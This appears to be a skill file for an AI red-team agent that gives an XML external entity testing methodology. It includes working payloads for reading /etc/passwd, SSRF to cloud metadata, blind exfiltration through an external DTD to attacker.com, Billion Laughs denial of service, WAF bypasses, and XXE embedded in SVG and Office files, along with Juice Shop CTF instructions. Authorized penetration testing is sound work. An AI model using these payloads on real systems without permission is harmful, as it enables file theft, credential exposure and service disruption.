---
name: xxe-testing
description: XML external entity injection for file read, SSRF, and DoS
origin: RedteamOpencode
---

# XXE Testing (XML External Entity Injection)

## When to Activate

- Application accepts XML input (SOAP, REST with XML, file upload)
- Content-Type `application/xml` or `text/xml` accepted
- File formats that use XML internally (DOCX, XLSX, SVG, XHTML)

## Tools

- `run_tool curl` (send crafted XML)
- Burp Suite Repeater
- XXEinjector
- Out-of-band server (Burp Collaborator, interactsh)

## Methodology

### 1. Identify XML Input Points

- [ ] API endpoints accepting XML body
- [ ] SOAP services
- [ ] File upload: SVG, DOCX, XLSX, XML config
- [ ] Change `Content-Type: application/json` to `application/xml` — test if accepted
- [ ] RSS/Atom feed import, SAML assertions

### 2. Classic XXE — File Read

- [ ] Basic entity:
      ```xml
      <?xml version="1.0"?>
      <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
      ]>
      <root>&xxe;</root>
      ```
- [ ] Windows: `file:///C:/windows/win.ini`
- [ ] PHP wrapper: `php://filter/convert.base64-encode/resource=/etc/passwd`
- [ ] Directory listing (Java): `file:///etc/` (may work on some parsers)

### 3. SSRF via XXE

- [ ] `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`
- [ ] Internal service probe: `http://localhost:8080/`, `http://internal-host/`
- [ ] Cloud metadata: AWS, GCP, Azure endpoints
- [ ] Port scan: observe error differences per port

### 4. Blind XXE — Out-of-Band

- [ ] Parameter entity + external DTD:
      ```xml
      <!DOCTYPE foo [
        <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
        %xxe;
      ]>
      ```
- [ ] External DTD (`evil.dtd`):
      ```xml
      <!ENTITY % file SYSTEM "file:///etc/passwd">
      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
      %eval;
      %exfil;
      ```
- [ ] Error-based exfiltration: force parse error containing file data
- [ ] FTP-based exfiltration for multi-line files

### 5. Denial of Service

- [ ] Billion Laughs:
      ```xml
      <!ENTITY lol "lol">
      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
      ```
- [ ] Recursive entity expansion
- [ ] External entity pointing to `/dev/random` or large file

### 6. Bypass Techniques

- [ ] UTF-16 encoding: `<?xml version="1.0" encoding="UTF-16"?>`
- [ ] CDATA wrapping to exfiltrate XML-breaking characters
- [ ] XInclude: `<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>`
- [ ] HTML entities instead of XML entities
- [ ] Content-Type switch: JSON → XML if parser auto-detects
- [ ] Nested ENTITY definitions to evade WAF patterns

### 7. SVG / Office File XXE

- [ ] Embed XXE in SVG uploaded as image
- [ ] Embed XXE in DOCX: modify `[Content_Types].xml` or embedded XML parts
- [ ] XLSX: inject in `xl/sharedStrings.xml`

### 8. CTF / Juice Shop Recall Contract

When Juice Shop exposes XML-capable routes or file upload/download flows, do one bounded
XXE recall pass before closing the case:

- Try a safe `Content-Type: application/xml` switch on API endpoints already accepting JSON
  only after confirming it stays within the normal 1-2 representative probe budget.
- For upload surfaces, include one SVG/XML payload carrying a benign external entity marker
  and then visit the consumer route that parses/renders the uploaded file.
- Preserve explicit solved-state or negative evidence for `XXE Data Access`; if parser
  behavior is unclear, return `REQUEUE` with the exact XML-capable endpoint/file consumer
  rather than marking the family exhausted.

## What to Record

- Endpoint and input vector (body, file upload, header)
- Payload used and data exfiltrated
- Blind vs reflected
- Out-of-band callback evidence
- Internal resources accessed (files, metadata, services)
- Severity: Critical (file read/SSRF) or High (blind confirmed)
- Remediation: disable DTD processing, disable external entities, use JSON
